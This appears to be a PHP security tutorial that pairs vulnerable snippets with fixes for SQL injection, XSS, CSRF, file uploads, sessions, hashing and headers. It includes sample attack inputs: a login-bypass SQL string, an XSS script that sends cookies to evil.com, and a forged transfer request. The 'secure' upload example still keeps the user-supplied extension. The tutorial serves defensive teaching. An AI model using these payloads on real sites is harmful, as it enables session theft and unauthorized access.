Introduction — Why PHP Security?

PHP powers over 77% of all websites on the internet. But poorly written code opens doors for attackers. In this course you will learn how to write secure PHP code and protect your applications from the most common vulnerabilities.

What You Will Learn

SQL Injection — XSS — CSRF — RCE — File Upload Attacks — Session Hijacking — and how to defend against each one with the right code.

Requirements

Basic knowledge of PHP and HTML. No prior security experience needed.

SQL Injection

What is SQL Injection?

An attack that happens when the attacker inserts SQL commands into input fields instead of real data, allowing them to read, delete, or bypass authentication in your database.

Vulnerable Code Example

//  Dangerous — user input directly in the query
$user = $_GET['username'];
$query = "SELECT * FROM users WHERE username = '$user'";

The attacker types: ' OR '1'='1 — and bypasses the password entirely!

The Fix — Prepared Statements

//  Safe — use PDO with Prepared Statements
$pdo = new PDO("mysql:host=localhost;dbname=mydb", $user, $pass);
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_GET['username']]);
$result = $stmt->fetch();

A Prepared Statement separates code from data — no matter what the attacker types, it is treated as plain text only.

Golden Rules

Always use PDO or MySQLi with Prepared Statements.

Never put any user input directly inside a SQL query.

Grant your database account the least privileges necessary (Principle of Least Privilege).

XSS — Cross-Site Scripting

What is XSS?

The attacker injects JavaScript code into a web page — it executes when the victim opens the page in their browser. Used to steal Cookies, hijack user sessions, or redirect victims to malicious sites.

Vulnerable Code Example

//  Dangerous — outputting input directly
echo "Hello " . $_GET['name'];

The attacker types: <script>document.location='https://evil.com?c='+document.cookie</script>

The Fix — htmlspecialchars

//  Safe — convert special characters
echo "Hello " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');

Content Security Policy (CSP)

// Add this header to block external script execution
header("Content-Security-Policy: default-src 'self'");

Golden Rules

Use htmlspecialchars() on all user output.

Enable Content Security Policy.

Use HttpOnly and Secure flags on all Cookies.

CSRF — Cross-Site Request Forgery

What is CSRF?

The attacker tricks a logged-in user into executing a request without their knowledge — such as transferring money or changing their email — because the browser automatically sends Cookies with every request.

Attack Example

<!-- The attacker's page contains -->
<img src="https://yourbank.com/transfer?to=attacker&amount=1000">

As soon as the victim opens the page, the request fires using their session!

The Fix — CSRF Token

// Generate a token in the Session
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Inside the Form
echo '<input type="hidden" name="csrf_token"
       value="' . $_SESSION['csrf_token'] . '">';

// When processing the request
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die("CSRF attack detected!");
}

Golden Rules

Add a CSRF Token to every Form that modifies data.

Use SameSite=Strict in your Cookie settings.

Validate the Referer Header as an extra layer.

File Upload Attacks

The Danger of File Uploads

If you allow users to upload files without validation, an attacker can upload a malicious PHP file and execute it on the server — this is called Remote Code Execution (RCE).

Vulnerable Code Example

//  Dangerous — no validation at all
move_uploaded_file($_FILES['file']['tmp_name'],
                   'uploads/' . $_FILES['file']['name']);

The Secure Solution

$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
$max_size = 2 * 1024 * 1024; // 2MB

$file = $_FILES['upload'];

// 1. Check the real MIME type (not just the extension)
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime = $finfo->file($file['tmp_name']);

if (!in_array($mime, $allowed_types)) {
    die("File type not allowed!");
}

// 2. Check file size
if ($file['size'] > $max_size) {
    die("File is too large!");
}

// 3. Rename the file randomly
$ext = pathinfo($file['name'], PATHINFO_EXTENSION);
$new_name = bin2hex(random_bytes(16)) . '.' . $ext;

// 4. Save outside the public folder if possible
move_uploaded_file($file['tmp_name'], 'uploads/' . $new_name);

Golden Rules

Validate the real MIME type using finfo, not just the file extension.

Rename every uploaded file with a random name.

Do not store files in a publicly accessible folder unless they are images.

Add a .htaccess file in the upload folder to block PHP execution.

Session Security

What is Session Hijacking?

The attacker steals the Session ID to impersonate the user. This happens via XSS, insecure WiFi networks, or Session Fixation attacks.

Secure Session Configuration

// At the top of every PHP file or in php.ini
ini_set('session.cookie_httponly', 1);   // Prevent JS from reading the Cookie
ini_set('session.cookie_secure', 1);     // HTTPS only
ini_set('session.cookie_samesite', 'Strict');
ini_set('session.use_strict_mode', 1);
ini_set('session.gc_maxlifetime', 1800); // 30 minutes

session_start();

Session Regeneration

// Right after login — prevent Session Fixation
session_start();
session_regenerate_id(true); // true = delete the old session

$_SESSION['user_id'] = $user['id'];
$_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];

Validate Session Identity

// On every request — verify the session belongs to the same device
session_start();

if ($_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT'] ||
    $_SESSION['ip'] !== $_SERVER['REMOTE_ADDR']) {
    session_destroy();
    die("Session invalid — please login again.");
}

Golden Rules

Always call session_regenerate_id(true) after login.

Enable HttpOnly and Secure flags on the Cookie.

Store User-Agent and IP in the session and verify them on each request.

Set a session expiry time.

Password Hashing

Why Not Store Passwords as Plain Text?

If your database leaks, the attacker gets every password immediately. The solution is to store a one-way Hash that cannot be reversed.

The Correct Code

//  Hash the password on registration
$hashed = password_hash($_POST['password'], PASSWORD_BCRYPT);
// Store $hashed in the database

//  Verify on login
$user = $stmt->fetch(); // from the database
if (password_verify($_POST['password'], $user['password'])) {
    // Password is correct
} else {
    // Wrong password
}

Why PASSWORD_BCRYPT?

BCrypt is intentionally slow — each attempt takes time, making Brute Force attacks practically impossible. PHP handles the Salt automatically.

Golden Rules

Use only password_hash() and password_verify() — never MD5 or SHA1.

Do not add a Salt manually — PHP does it automatically.

Use PASSWORD_ARGON2ID if available — stronger than BCrypt.

Security Headers

What are Security Headers?

Headers sent with every page that instruct the browser to enforce additional security policies — a free and important protection layer.

Essential Headers

// Add at the top of every page or in a shared include file
header("X-Frame-Options: DENY");                     // Prevent Clickjacking
header("X-Content-Type-Options: nosniff");           // Prevent MIME Sniffing
header("X-XSS-Protection: 1; mode=block");           // Browser XSS protection
header("Referrer-Policy: strict-origin-when-cross-origin");
header("Permissions-Policy: geolocation=(), microphone=()");
header("Strict-Transport-Security: max-age=31536000; includeSubDomains"); // HTTPS only
header("Content-Security-Policy: default-src 'self'; script-src 'self'");

Golden Rules

Add these headers in a shared file included on every page.

Test your site at securityheaders.com.

HSTS enforces HTTPS — do not enable it unless you have a valid SSL certificate.

Error Handling and Information Disclosure

Why Are Error Messages Dangerous?

Detailed error messages reveal to the attacker: file paths, database type, PHP version, and code structure — all golden information for launching an attack.

Production Settings

// In php.ini or in code — production environment
ini_set('display_errors', 0);        // Never show errors to the user
ini_set('log_errors', 1);            // Log them to a file instead
ini_set('error_log', '/var/log/php_errors.log'); // Safe path outside public

// Development environment only
// ini_set('display_errors', 1);
// ini_set('error_reporting', E_ALL);

Safe Error Handling

try {
    $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
    $stmt->execute([$id]);
} catch (PDOException $e) {
    // Log the detailed error internally only
    error_log("DB Error: " . $e->getMessage());

    // Show the user a generic message
    die("Something went wrong. Please try again later.");
}

Golden Rules

In production: disable display_errors completely.

Log errors to a file outside the web root.

Show users generic messages — never expose technical details.

Security Checklist

Before Deploying Any PHP Project

All SQL queries use Prepared Statements

All user output passes through htmlspecialchars()

All data-modifying Forms include a CSRF Token

File uploads validate the real MIME Type

Passwords are stored with password_hash() only

Sessions call session_regenerate_id() after login

Security Headers are added on every page

display_errors is disabled in production

HTTPS is enabled with a valid SSL certificate

Database account has minimum required privileges
